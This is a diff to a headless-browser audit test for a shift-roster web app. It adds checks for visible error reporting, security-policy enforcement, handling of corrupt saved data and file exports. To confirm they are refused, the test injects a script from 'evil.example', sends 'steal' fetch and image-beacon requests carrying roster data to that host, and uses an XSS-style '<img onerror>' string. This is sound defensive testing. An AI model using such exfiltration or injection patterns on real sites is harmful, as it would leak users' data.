@@ -6,9 +6,10 @@
  *
  * Loads index.html in headless Chromium and asserts the scheduling rules that
  * the app promises. Exits non-zero if any rule is broken, so CI catches
- * regressions. It runs with the network blocked, so Firebase never loads and nothing
- * here can reach the real project; the app opens the way it does on a signed-in
- * device that is offline (the `rn_signed` marker). Signing in itself, the cloud roster
+ * regressions. It runs with the network blocked and the Firebase files withheld, so
+ * nothing here can reach the real project; the app opens the way it does on a
+ * signed-in device where Firebase could not load (the `rn_signed` marker). The Excel
+ * and PDF libraries do load, from vendor/, under the page's real security policy. Signing in itself, the cloud roster
  * and the security rules are covered by test/cloud.mjs in the Firebase emulators.
  */
 import { chromium } from 'playwright';
@@ -35,6 +36,10 @@ async function launch() {
 const browser = await launch();
 const ctx = await browser.newContext();
 await ctx.route(/^https?:\/\//, r => r.abort());            // offline on purpose: same result in CI and in a sandbox
+await ctx.route(/\/vendor\/firebase-/, r => r.abort());     // and no Firebase: that side is test/cloud.mjs
+const cspBlocked = [];
+await ctx.exposeBinding('__cspBlocked', (src, v) => { cspBlocked.push(v); });
+await ctx.addInitScript(() => document.addEventListener('securitypolicyviolation', e => window.__cspBlocked(`${e.blockedURI} (${e.violatedDirective})`)));
 await ctx.addInitScript(() => sessionStorage.setItem('rn_signed', '1'));
 const page = await ctx.newPage();
 const pageErrors = [];
@@ -840,6 +845,7 @@ check('the banner is quiet about nights at a minimum of 3', nightMin.bannerQuiet
 /* ---------------- 4e. lock screen (signing in itself is test/cloud.mjs) ---------------- */
 const lctx = await browser.newContext();
 await lctx.route(/^https?:\/\//, r => r.abort());
+await lctx.route(/\/vendor\/firebase-/, r => r.abort());
 const lpage = await lctx.newPage();
 lpage.on('pageerror', e => pageErrors.push('lock screen: ' + e));
 await lpage.goto(APP);
@@ -920,9 +926,90 @@ check('other lists are taken whole, never stitched', mrg.listWhole === true);
 check('the clash log from the cloud is cut to shape and shown as text', mrg.logClean === true && mrg.noteSafe === true && mrg.dismissed === true);
 check('comparing rosters ignores key order', mrg.keyOrder === true);
 
+/* ---------------- 4g. failures are visible; the security policy holds ---------------- */
+const vis = await page.evaluate(async () => {
+  const out = {}, box = document.getElementById('errNote'), body = () => document.getElementById('errNoteBody').textContent;
+  out.quietBefore = box.hidden && problems.length === 0;
+  // an exception nobody caught, and a promise nobody handled
+  setTimeout(() => { throw new Error('audit: uncaught <img src=x onerror=1>'); }, 0);
+  Promise.reject(Object.assign(new Error('audit: unhandled'), { code: 'audit/unhandled' }));
+  await new Promise(r => setTimeout(r, 150));
+  out.shown = !box.hidden && body().includes('audit: uncaught') && body().includes('audit/unhandled');
+  out.asText = document.querySelectorAll('#errNote img').length === 0 && body().includes('<img src=x');
+  noteProblem('same thing twice'); noteProblem('same thing twice');
+  out.noRepeat = problems.filter(p => p === 'same thing twice').length === 1;
+  for (let i = 0; i < 9; i++) noteProblem('flood ' + i);
+  out.capped = problems.length === 5;
+  dismissProblems();
+  out.dismissed = box.hidden && problems.length === 0 && body() === '';
+  // the security policy: an injected script from elsewhere, an eval, and a request to another site are all refused
+  const inj = document.createElement('script'); inj.src = 'https://evil.example/x.js'; document.head.appendChild(inj);
+  try { new Function('window.__evaled = 1')(); } catch (e) { out.evalThrew = true; }
+  out.fetchRefused = await fetch('https://evil.example/steal?d=roster').then(() => false, () => true);
+  new Image().src = 'https://evil.example/pixel.gif?d=roster';
+  await new Promise(r => setTimeout(r, 200));
+  out.noEval = window.__evaled === undefined && out.evalThrew === true;
+  out.cspReported = problems.filter(p => /stopped from loading or contacting/.test(p)).length >= 3;
+  out.cspText = problems.join(' || ');
+  dismissProblems();
+  // unreadable saved data: not swallowed, and the unreadable copy is kept
+  const key = STORE_KEY, good = localStorage.getItem(key);
+  localStorage.setItem(key, '{"names":["A"],"overrides":');           // cut off mid-write
+  loadState();
+  out.corruptTold = !box.hidden && /could not be read/.test(body());
+  out.corruptKept = localStorage.getItem(key + '_unreadable') === '{"names":["A"],"overrides":';
+  out.stillUsable = Array.isArray(names) && names.length >= 1 && ids.length === names.length;
+  localStorage.removeItem(key + '_unreadable'); localStorage.setItem(key, good); loadState(); render(); dismissProblems();
+  out.libs = typeof ExcelJS === 'object' && typeof jspdf === 'object' && typeof jspdf.jsPDF === 'function';
+  return out;
+});
+// the 3 violations provoked above are expected; they must be the only ones in the whole run
+const provoked = cspBlocked.filter(v => /evil\.example|eval/.test(v)).length;
+console.log('\n--- visible failures and the security policy ---');
+check('nothing was reported during the whole audit before this point', vis.quietBefore === true);
+check('an uncaught error and an unhandled promise both reach the red banner', vis.shown === true);
+check('what the banner shows is text, never markup', vis.asText === true);
+check('the same problem is listed once; the list is capped', vis.noRepeat === true && vis.capped === true);
+check('the banner can be dismissed', vis.dismissed === true);
+check('a script injected from another site is refused, and so is eval', vis.noEval === true);
+check('the page cannot send data to another site', vis.fetchRefused === true);
+check('blocked attempts are shown to the user, not hidden', vis.cspReported === true, vis.cspText);
+check('saved data that cannot be read is reported and set aside, not silently replaced', vis.corruptTold === true && vis.corruptKept === true && vis.stillUsable === true);
+check('the Excel and PDF libraries load from this site', vis.libs === true);
+
+/* ---------------- 4h. exports: the real Excel and PDF writers, under the security policy ---------------- */
+const fsx = await import('fs');
+async function grab(label, run) {
+  const [dl] = await Promise.all([page.waitForEvent('download', { timeout: 20000 }).catch(() => null), page.evaluate(run)]);
+  if (!dl) return { label, name: '(nothing was downloaded)', head: '', size: 0 };
+  const file = await dl.path(), buf = fsx.readFileSync(file);
+  return { label, name: dl.suggestedFilename(), head: buf.subarray(0, 4).toString('latin1'), size: buf.length };
+}
+await page.evaluate(() => { manualMode = false; cycleOffset = 0; render();
+  const k = cycleDayKeys(0); overrides[k[2]] = { [rid(1)]: 'REQ' }; notes[k[2]] = { [rid(1)]: 'exam' }; render(); });
+const files = [
+  await grab('roster Excel', () => { exportExcel(); }),
+  await grab('roster PDF', () => { exportPDF(); }),
+  await grab('request report Excel', () => { exportRequestReport(); }),
+  await grab('monthly report PDF', () => { openReport(); downloadReportPDF(); closeReport(); }),
+  await grab('fairness PDF', () => { openFairness(); downloadFairnessPDF(); document.getElementById('fairModal').classList.remove('open'); }),
+  await grab('backup', () => { exportBackup(); })
+];
+await page.evaluate(() => { overrides = {}; notes = {}; render(); });
+console.log('\n--- exports ---');
+const kinds = { 'roster Excel': ['.xlsx', 'PK\u0003\u0004'], 'roster PDF': ['.pdf', '%PDF'], 'request report Excel': ['.xlsx', 'PK\u0003\u0004'],
+  'monthly report PDF': ['.pdf', '%PDF'], 'fairness PDF': ['.pdf', '%PDF'], backup: ['.json', '{'] };
+for (const f of files) {
+  const [ext, magic] = kinds[f.label];
+  check(`${f.label} downloads as a real ${ext} file`, f.name.endsWith(ext) && f.head.startsWith(magic) && f.size > 200, `${f.name} · ${f.size} bytes · starts ${JSON.stringify(f.head)}`);
+}
+check('exporting raised no problem banner', await page.evaluate(() => document.getElementById('errNote').hidden && problems.length === 0));
+
 /* ---------------- 5. no runtime errors ---------------- */
 console.log('\n--- runtime ---');
-check('no page errors', pageErrors.length === 0, pageErrors.join(' | '));
+check('the app itself never trips the security policy, exports included', cspBlocked.length === provoked && provoked >= 3, cspBlocked.join(' | '));
+const realErrors = pageErrors.filter(e => !/audit: (uncaught|unhandled)/.test(e));
+check('no page errors', realErrors.length === 0, realErrors.join(' | '));
 
 await browser.close();
 console.log(failures === 0 ? '\nAll checks passed.' : `\n${failures} check(s) FAILED.`);
